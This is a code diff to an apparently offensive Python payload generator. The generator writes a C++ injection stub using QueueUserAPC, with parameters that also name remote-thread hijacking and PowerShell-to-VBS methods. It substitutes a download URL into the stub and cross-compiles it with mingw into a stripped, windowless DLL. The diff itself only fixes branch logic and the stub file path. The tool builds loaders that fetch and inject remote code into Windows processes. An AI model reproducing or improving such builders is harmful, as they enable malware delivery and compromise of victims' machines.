@@ -146,7 +146,7 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                    os.system("""del "{0}"\n""".format(outfile))
                
               
-               elif Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
+               if Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
                    APC_Injection = APC_Injection.replace("URLREPLACE",URL)
                    stub = open("Stub\\stub.cpp", "w")
                    stub.write(APC_Injection)
@@ -273,7 +273,7 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                    os.system("""del "{0}"\n""".format(outfile))
                
               
-               elif Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
+               if Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
                    APC_Injection = APC_Injection.replace("URLREPLACE",URL)
                    stub = open("Stub\\stub.cpp", "w")
                    stub.write(APC_Injection)
@@ -295,7 +295,7 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                    stub.write(CurrentThread_stub)
                    stub.close()
                    
-               os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows -shared -o a.dll")
+               os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows -shared -o a.dll")
                if os.path.exists("a.dll"):
                    print(randomcolor()+"[+] Generated successfully! a.dll")
                else:{
